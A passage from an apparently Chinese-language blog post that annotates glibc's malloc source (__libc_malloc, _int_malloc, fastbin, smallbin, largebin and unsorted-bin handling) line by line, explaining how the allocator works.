class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr; <span class="hljs-comment">//表示分配区(arena)状态</span><br>  <span class="hljs-type">void</span> *victim; <span class="hljs-comment">//表示分配的内存块，最终返回给调用者</span><br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<span class="hljs-comment">//_malloc_hook是一个全局钩子函数指针，允许用于在malloc时插入自己的逻辑</span><br><span class="hljs-comment">//atomic_forced_read：确保_malloc_hook的读取是原子操作，防止多线程导致的错误</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<span class="hljs-comment">//RETURN_ADDRESS(0)获取当前函数的返回地址，用于调试和追踪</span><br><br>  arena_get (ar_ptr, bytes); <span class="hljs-comment">//获取分配区</span><br><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br><span class="hljs-comment">//如果第一次分配失败，并分配区不为空，则尝试从另一分配区重新分配</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<span class="hljs-comment">//尝试另一个可用分配区</span><br>      victim = _int_malloc (ar_ptr, bytes);<span class="hljs-comment">//再次调用分配的函数</span><br>    &#125;<br><br><span class="hljs-comment">//如果分配区不为空那就释放互斥锁(mutex)</span><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<span class="hljs-comment">//返回分配的内存块的指针</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>钩子函数指针：<ul><li>钩子： 钩子是一种拦截机制，允许程序在系统或应用程序的某些关键点插入自己的代码 </li><li>钩子函数指针： 钩子函数指针是一个指向函数的指针，它指向的函数是用户定义的回调函数。当某个事件被触发时，系统会调用这个指针指向的函数，从而执行<strong>用户定义的逻辑</strong>。</li></ul></li><li>原子操作：<ul><li>原子操作是指一个不可分割的操作，它在执行过程中不会被中断或干扰，要么完全执行，要么完全不执行，中间状态不会被其他操作看到。 主要用于多线程或并发编程环境，避免出现竞态条件和数据不一致环境</li></ul></li></ul><p>对于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<span class="hljs-comment">//_malloc_hook是一个全局钩子函数指针，允许用于在malloc时插入自己的逻辑</span><br><span class="hljs-comment">//atomic_forced_read：确保_malloc_hook的读取是原子操作，防止多线程导致的错误</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<span class="hljs-comment">//RETURN_ADDRESS(0)获取当前函数的返回地址，用于调试和追踪</span><br></code></pre></td></tr></table></figure><p>hook被初始化为<code>_malloc_hook</code></p><p><code>_malloc_hook</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">weak_variable</span> <span class="hljs-params">(*__malloc_hook)</span><br>  <span class="hljs-params">(<span class="hljs-type">size_t</span> __size, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)</span> = malloc_hook_ini;<br></code></pre></td></tr></table></figure><p>这是对<code>_malloc_hook</code>的初始化，将其指向一个名为<code>malloc_hook_ini</code></p><p><code>malloc_hook_ini</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">malloc_hook_ini</span><span class="hljs-params">(<span class="hljs-type">size_t</span> sz, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* caller)</span> &#123;<br>    __malloc_hook = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 禁用当前钩子，防止递归调用，这里保证在多次调用_libc_malloc情况下只会在第一次时调用hook</span><br>    ptmalloc_init();       <span class="hljs-comment">// 初始化内存分配器</span><br>    <span class="hljs-keyword">return</span> __libc_malloc(sz);  <span class="hljs-comment">// 调用原始的 malloc 函数</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里又调用了<code>ptmalloc_init()</code>，是一个初始化函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">ptmalloc_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (__malloc_initialized &gt;= <span class="hljs-number">0</span>)<span class="hljs-comment">//检查是否已经初始化了__malloc_initialized是一个全局变量，用于记录内存分配器是否已经初始化。&gt;=0表示分配器已经初始化就直接返回，&lt;0是未初始化，要继续</span><br>    <span class="hljs-keyword">return</span>;<br>  __malloc_initialized = <span class="hljs-number">0</span>;<span class="hljs-comment">//表示分配器正在初始化，防止其他线程重复初始化</span><br>  <br>  thread_arena = &amp;main_arena;<span class="hljs-comment">//将线程本地分配区指向主分配区</span><br>  <br>  __malloc_initialized = <span class="hljs-number">1</span>;<span class="hljs-comment">//标记初始化完成</span><br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><p>第一次调用时要初始化那些东西，而后再次调用时，就跳过了直接到<code>_int_malloc</code></p><p>可以由代码看到<code>arena_get (ar_ptr, bytes);</code>后就到了<code>_int_malloc</code>，这是ptmalloc分配器的核心函数，负责实际的内存分配逻辑，那么接下去就到了<code>_int_malloc</code>源码部分</p><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="__int_malloc"></a>__int_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size (规范化请求大小)*/</span><br>     <span class="hljs-comment">//nb是经过调整后的请求大小</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index （关联的bin索引）*/</span><br>     <span class="hljs-comment">//idx是请求大小对应的bin索引</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin（关联的bin） */</span><br>     <span class="hljs-comment">//bin是一个指向bin的指针，表示当前请求大小对应的bin</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk（检查/选择的块） */</span><br>     <span class="hljs-comment">//victim：指针，指向当前正在检查或选择的内存块</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>     <span class="hljs-comment">//size是当前内存块的大小</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index（它的bin索引） */</span><br>    <span class="hljs-comment">//=当前内存块所属的bin索引</span><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split （分割后的剩余部分）*/</span><br>     <span class="hljs-comment">//指针，指向分割后的剩余部分</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br>     <span class="hljs-comment">//剩余部分大小</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser （位图遍历器）*/</span><br>     <span class="hljs-comment">//block用来遍历位图</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser （位图遍历器）*/</span><br>     <span class="hljs-comment">//bit是另一个变量，用来遍历位图中的位</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap（当前binmap中的word） */</span><br>     <span class="hljs-comment">//map是当前正在处理的binmap中的一个字(word)</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking（链接时的临时变量） */</span><br>     <span class="hljs-comment">//一个临时指针，用于链接</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking （链接时的临时变量）*/</span><br>     <span class="hljs-comment">//另一个临时指针，用于链接</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">   overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">   to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">   size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">   that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">   aligned.</span><br><span class="hljs-comment"> */</span><br><br>checked_request2size (bytes, nb);<span class="hljs-comment">//将请求的大小转换为内部实际请求的大小</span><br></code></pre></td></tr></table></figure><p>然后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br><span class="hljs-comment">/* 没有可用的分配区域（arena）。回退到 sysmalloc，通过 mmap 获取一块内存。 */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<span class="hljs-comment">//检查是否有可用arena</span><br>    &#123;<br>       <span class="hljs-comment">//没有时</span><br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></td></tr></table></figure><p>接着来到fast bins</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<span class="hljs-comment">//判断是否符合fast bins的条件</span><br>  &#123;<br>    idx = fastbin_index (nb);<span class="hljs-comment">//根据请求大小计算对应的fast bins的索引</span><br>    mfastbinptr *fb = &amp;fastbin (av, idx);<span class="hljs-comment">//获取fastbin指针</span><br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span><span class="hljs-comment">//尝试从fastbins中取出一个内存块</span><br>      &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>           != victim);<span class="hljs-comment">//原子操作。如果当前值等于预期值（victim），则将变量更新为新值（victim-&gt;fd），并返回原值（victim）。如果当前值不等于预期值，则返回当前值</span><br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<span class="hljs-comment">//检查内存块是否有效</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<span class="hljs-comment">//检查该fastbin的size是否合法</span><br>          &#123;<br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>          errout:<br>            malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>          &#125;<br>        check_remalloced_chunk (av, victim, nb);<span class="hljs-comment">//检查内存块是否被重新分配。转到定义看</span><br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<span class="hljs-comment">//将内存块转换为用户可用的内存地址</span><br>        alloc_perturb (p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p><code>check_remalloced_chunk</code>定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> !MALLOC_DEBUG</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_chunk(A, P)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_free_chunk(A, P)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_inuse_chunk(A, P)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_remalloced_chunk(A, P, N)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_malloced_chunk(A, P, N)</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_malloc_state(A)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_chunk(A, P)              do_check_chunk (A, P)<span class="hljs-comment">//检查内存块P的状态是否符合预期</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_free_chunk(A, P)         do_check_free_chunk (A, P)<span class="hljs-comment">//检查已释放的内存块P状态</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)<span class="hljs-comment">//检查正在使用的内存块P状态</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)<span class="hljs-comment">//检查重新分配的内存块P状态</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)<span class="hljs-comment">//检查新分配的内存块P状态</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> check_malloc_state(A)         do_check_malloc_state (A)<span class="hljs-comment">//检查分配区A状态是否一致</span></span><br></code></pre></td></tr></table></figure><ul><li>MALLOC_DEBUG是一个宏，用于控制是否开启了调试<ul><li>未定义：则所有调试检查宏被定义为空，不执行任何操作</li><li>定义：这些宏会被定义为调用实际的检查函数</li></ul></li></ul><h3 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">    hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">    (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">    processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">    anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">  */</span><br><br> <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<span class="hljs-comment">//检查是否属于smallbin范围内</span><br>   &#123;<br>     idx = smallbin_index (nb);<span class="hljs-comment">//计算smallbin索引</span><br>     bin = bin_at (av, idx);<span class="hljs-comment">//获取smallbin指针</span><br><br>     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<span class="hljs-comment">//尝试从smallbin中分配内存</span><br>       &#123;<br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check（初始化检查） */</span><br>           malloc_consolidate (av);<span class="hljs-comment">//如果分配区还没初始化就初始化，这是初始化函数</span><br>         <span class="hljs-keyword">else</span><br>           &#123;<br>             bck = victim-&gt;bk;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="hljs-comment">//检查双向链表完整性</span><br>               &#123;<br>                 errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                 <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>             set_inuse_bit_at_offset (victim, nb);<span class="hljs-comment">//标记内存块已使用和设置内存块大小</span><br>              <span class="hljs-comment">//接下来两行是更新双向链表指针</span><br>             bin-&gt;bk = bck;<br>             bck-&gt;fd = bin;<br><br>             <span class="hljs-keyword">if</span> (av != &amp;main_arena)<span class="hljs-comment">//如果不属于主分配区，则进入if，标记为非主分配区</span><br>               victim-&gt;size |= NON_MAIN_ARENA;<br>             check_malloced_chunk (av, victim, nb);<span class="hljs-comment">//检查内存块</span><br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<span class="hljs-comment">//转换</span><br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h3 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If this is a large request, consolidate fastbins before continuing.</span><br><span class="hljs-comment">   While it might look excessive to kill all fastbins before</span><br><span class="hljs-comment">   even seeing if there is space available, this avoids</span><br><span class="hljs-comment">   fragmentation problems normally associated with fastbins.</span><br><span class="hljs-comment">   Also, in practice, programs tend to have runs of either small or</span><br><span class="hljs-comment">   large requests, but less often mixtures, so consolidation is not</span><br><span class="hljs-comment">   invoked all that often in most programs. And the programs that</span><br><span class="hljs-comment">   it is called frequently in otherwise tend to fragment.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">else</span><br>  &#123;<br>    idx = largebin_index (nb);<span class="hljs-comment">//计算largebin索引</span><br>    <span class="hljs-keyword">if</span> (have_fastchunks (av))<span class="hljs-comment">//检查分配区有没有fastbins中的内存块，如果有就合并</span><br>      malloc_consolidate (av);<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="大循环"><a href="#大循环" class="headerlink" title="大循环"></a>大循环</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>   &#123;<br>     <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<span class="hljs-comment">//初始化计数器防止无限循环</span><br></code></pre></td></tr></table></figure><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="hljs-comment">//从unsorted bin取出chunkunsorted_chunks(av)：获取未排序 chunk 列表的头指针。victim：当前尝试分配的 chunk</span><br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<span class="hljs-comment">//检查chunk有效，小于2*SIZE_SZ和大于分配区总内存大小的就是无效的</span><br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<span class="hljs-comment">//计算chunk实际大小</span><br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br>      <span class="hljs-comment">/* 如果是一个小请求，尝试使用上一次的剩余部分（remainder），前提是无序链表（unsorted bin）中只有一个块。这有助于提升连续小请求的局部性。这是最佳拟合（best-fit）策略的唯一例外，仅适用于没有精确匹配的小块。 */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<span class="hljs-comment">//如果请求的是小块内存且unsortedbin只有一个chunk(last_remainder)且该chunk大小大于请求大小+MINSIZE</span><br>            &#123;<br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>               <span class="hljs-comment">//分割chunk</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>               <span class="hljs-comment">//更新unsorted bin</span><br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  